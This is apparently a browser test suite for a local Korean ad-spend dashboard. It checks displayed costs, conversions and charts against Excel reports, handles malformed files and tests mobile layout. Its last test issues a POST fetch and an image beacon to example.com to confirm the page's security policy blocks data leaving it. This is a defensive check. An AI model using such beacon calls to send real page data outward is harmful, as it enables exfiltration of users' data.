// 실제 브라우저(헤드리스 Edge/Chrome)로 dashboard.html을 열어 파일을 넣고, 화면 숫자를 엑셀과 비교합니다.
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { REPORTS, fixture, readExcel, ensureFixtures, parseMemo, digits, launchBrowser, findBrowser } = require('./helpers');

const SHOTS = path.join(__dirname, 'screenshots');
const skip = findBrowser() ? false : 'Edge/Chrome이 없어 화면 테스트를 건너뜁니다';
let page;
let truth;

test.before(async () => {
  if (skip) return;
  ensureFixtures();
  truth = readExcel(REPORTS);
  page = await launchBrowser();
  await page.open(1200);
});
test.after(async () => { if (page) await page.close(); });

test('파일을 넣기 전에는 안내 문구만 보인다', { skip }, async () => {
  const s = await page.snapshot();
  assert.equal(s.contentHidden, true);
});

test('42~44주를 끌어다 놓으면 맨 위 카드에 44주 비용·전환·전환당 비용이 엑셀 합계와 같게 나온다', { skip }, async () => {
  await page.dropFiles(REPORTS);
  const s = await page.snapshot();
  const t = truth[2].rows['합계'];
  assert.equal(s.contentHidden, false);
  assert.match(s.title, /^44주 \(10\/26~11\/1\)$/);
  assert.equal(s.kpi.cost, '2,443,512원');
  assert.equal(digits(s.kpi.cost), t['비용(원)']);
  assert.equal(digits(s.kpi.conversions), t['전환']);
  assert.equal(digits(s.kpi.cpa), t['전환당 비용(원)']);
  assert.equal(s.messages.filter((m) => m.type === 'ok').length, 3);
  await page.screenshot(path.join(SHOTS, '1_대시보드_42-44주.png'));
});

test('지난주 대비 증감이 엑셀 메모(44주)에 적힌 값과 같다', { skip }, async () => {
  const s = await page.snapshot();
  const memo = parseMemo(truth[2].memo);
  const t44 = truth[2].rows['합계'], t43 = truth[1].rows['합계'];
  assert.ok(s.change.cost.includes(`+${memo.costPct.toFixed(1)}%`), s.change.cost);
  assert.ok(s.change.conversions.includes(`+${memo.convDiff}건`), s.change.conversions);
  assert.ok(s.change.conversions.includes(`+${memo.convPct.toFixed(1)}%`), s.change.conversions);
  assert.ok(s.change.cpa.includes(`${memo.cpaPct.toFixed(1)}%`), s.change.cpa);
  assert.ok(s.change.cpa.includes('개선'), '전환당 비용이 내려가면 개선');
  assert.ok(s.change.conversions.includes('개선'), '전환이 늘면 개선');
  // 비교 기준(43주) 금액도 화면에 엑셀 값 그대로
  assert.ok(s.delta.cost.includes(`${t43['비용(원)'].toLocaleString('ko-KR')}원`), s.delta.cost);
  assert.ok(s.delta.cost.includes(`+${(t44['비용(원)'] - t43['비용(원)']).toLocaleString('ko-KR')}원`), s.delta.cost);
  assert.ok(s.delta.cpa.includes(`${t43['전환당 비용(원)'].toLocaleString('ko-KR')}원`), s.delta.cpa);
});

test('상세 표의 모든 숫자(3주 × 4행 × 3항목)가 엑셀과 같다', { skip }, async () => {
  const s = await page.snapshot();
  const header = { cost: '비용(원)', conversions: '전환', cpa: '전환당 비용(원)' };
  let n = 0;
  for (const t of truth) {
    for (const [channel, row] of Object.entries(t.rows)) {
      for (const [field, h] of Object.entries(header)) {
        const cell = s.table.find((c) => c.week === t.week && c.channel === channel && c.field === field);
        assert.ok(cell, `${t.week}주 ${channel} ${h} 칸`);
        assert.equal(digits(cell.text), row[h], `${t.week}주 ${channel} ${h}: 화면 '${cell.text}'`);
        n++;
      }
    }
  }
  assert.equal(n, 36);
  assert.equal(s.table.length, 36, '표에 여분의 행 없음');
});

test('그래프의 점이 엑셀 값과 같고, 값에 맞는 높이에 그려진다', { skip }, async () => {
  const s = await page.snapshot();
  const charts = { cost: '비용(원)', cpa: '전환당 비용(원)' };
  for (const [chart, h] of Object.entries(charts)) {
    const pts = s.points[chart];
    const expected = [];
    for (const t of truth) for (const ch of ['네이버', '메타', '구글']) expected.push({ series: ch, week: t.week, value: t.rows[ch][h] });
    if (chart === 'cpa') for (const t of truth) expected.push({ series: '전체', week: t.week, value: t.rows['합계'][h] });
    assert.equal(pts.length, expected.length, `${chart} 점 개수`);
    for (const e of expected) {
      const p = pts.find((x) => x.series === e.series && x.week === e.week);
      assert.ok(p, `${chart} ${e.series} ${e.week}주 점`);
      assert.equal(p.value, e.value, `${chart} ${e.series} ${e.week}주`);
    }
    // 높이(cy)가 값에 정비례해 내려가는지: 모든 점이 같은 직선 cy = a - b·value 위에 있어야 함
    const [p1, p2] = [pts.reduce((a, b) => (a.value < b.value ? a : b)), pts.reduce((a, b) => (a.value > b.value ? a : b))];
    const slope = (p2.cy - p1.cy) / (p2.value - p1.value);
    assert.ok(slope < 0, '값이 클수록 위쪽');
    for (const p of pts) assert.ok(Math.abs(p1.cy + slope * (p.value - p1.value) - p.cy) < 0.05, `${chart} ${p.series} ${p.week}주 높이`);
    // 선 끝 이름표 (색만으로 구분하지 않도록)
    for (const ch of ['네이버', '메타', '구글']) assert.ok(s.labels[chart].includes(ch), `${chart} 이름표 ${ch}`);
    assert.ok(['42주', '43주', '44주'].every((w) => s.labels[chart].includes(w)), `${chart} x축 주차`);
  }
});

test('같은 주 파일을 다시 넣으면(같은 파일 · 이름만 다른 사본) 한 번만 반영된다', { skip }, async () => {
  const before = await page.snapshot();
  await page.addFiles([REPORTS[2], fixture('주간보고_44주_사본.xlsx')]);
  const s = await page.snapshot();
  assert.equal(s.messages.length, 2);
  assert.ok(s.messages.every((m) => m.type === 'info' && m.text.includes('이미 반영')), JSON.stringify(s.messages));
  assert.deepEqual(s.kpi, before.kpi);
  assert.deepEqual(s.table, before.table);
  assert.equal(s.files.length, 3, '반영된 파일은 여전히 3주');
  assert.equal(s.points.cost.length, 9);
});

test('같은 주인데 숫자가 다른 수정본은 교체하고 그렇다고 알려 준다', { skip }, async () => {
  await page.addFiles([fixture('주간보고_44주_수정본.xlsx')]);
  const s = await page.snapshot();
  assert.equal(s.messages[0].type, 'warn');
  assert.match(s.messages[0].text, /44주를 새 파일로 교체했습니다/);
  assert.equal(s.kpi.cost, '2,453,512원');
  assert.equal(s.files.length, 3);
  assert.ok(s.files[0].includes('주간보고_44주_수정본.xlsx'));
});

const BAD = [
  ['양식다름_머리글.xlsx', "필요한 열이 없습니다: '비용(원)', '전환'"],
  ['양식다름_주차없음.xlsx', '몇 주차 보고서인지 알 수 없습니다'],
  ['양식다름_숫자아님.xlsx', "B5 셀(메타 · 비용(원)): 숫자가 아닙니다 ('약 82만')"],
  ['양식다름_다른표.xlsx', "'채널' 머리글이 있는 표를 찾지 못했습니다"],
  ['엑셀아님.xlsx', '엑셀(.xlsx) 파일이 아닙니다'],
  ['예전형식.xls', '예전 엑셀 형식(.xls)'],
];
test('양식이 다른 파일을 넣으면 파일마다 무엇이 문제인지 화면에 안내하고, 기존 숫자는 그대로 둔다', { skip }, async () => {
  await page.reset();
  await page.addFiles(REPORTS);
  const before = await page.snapshot();
  await page.dropFiles(BAD.map(([f]) => fixture(f)));
  const s = await page.snapshot();
  assert.equal(s.messages.length, BAD.length);
  BAD.forEach(([file, problem], i) => {
    const m = s.messages[i];
    assert.equal(m.type, 'error');
    assert.ok(m.text.includes(`'${file}'을(를) 반영하지 못했습니다`), m.text);
    assert.ok(m.text.includes(problem), `${file}: ${m.text}`);
  });
  const hints = s.messages.filter((m) => m.text.includes('주간보고 양식:'));
  assert.equal(hints.length, 1, '올바른 양식 안내는 한 번만');
  assert.equal(hints[0], s.messages[s.messages.length - 1], '안내는 마지막 오류에');
  assert.deepEqual(s.kpi, before.kpi);
  assert.deepEqual(s.table, before.table);
  await page.screenshot(path.join(SHOTS, '2_양식오류_안내.png'));
});

test('휴대폰 폭(390px)에서도 가로 스크롤 없이 보인다', { skip }, async () => {
  await page.setWidth(390);
  const s = await page.snapshot();
  assert.ok(s.scrollWidth <= s.innerWidth, `scrollWidth ${s.scrollWidth} > ${s.innerWidth}`);
  await page.screenshot(path.join(SHOTS, '3_휴대폰폭.png'));
  await page.setWidth(1200);
});

test('외부로 나간 요청이 하나도 없고, 페이지 오류도 없다', { skip }, async () => {
  const external = page.requests.filter((u) => !/^(file|data|blob|about):/.test(u));
  assert.deepEqual(external, [], '외부 요청');
  assert.deepEqual(page.consoleErrors, [], '페이지 오류');
});

test('페이지 코드가 외부로 보내려고 해도 브라우저가 막는다 (보안 정책)', { skip }, async () => {
  const result = await page.evaluate(`fetch('https://example.com/collect', { method: 'POST', body: 'x' }).then(() => 'sent', (e) => 'blocked')`);
  assert.equal(result, 'blocked');
  const img = await page.evaluate(`new Promise((r) => { const i = new Image(); i.onload = () => r('sent'); i.onerror = () => r('blocked'); i.src = 'https://example.com/p.png'; })`);
  assert.equal(img, 'blocked');
});
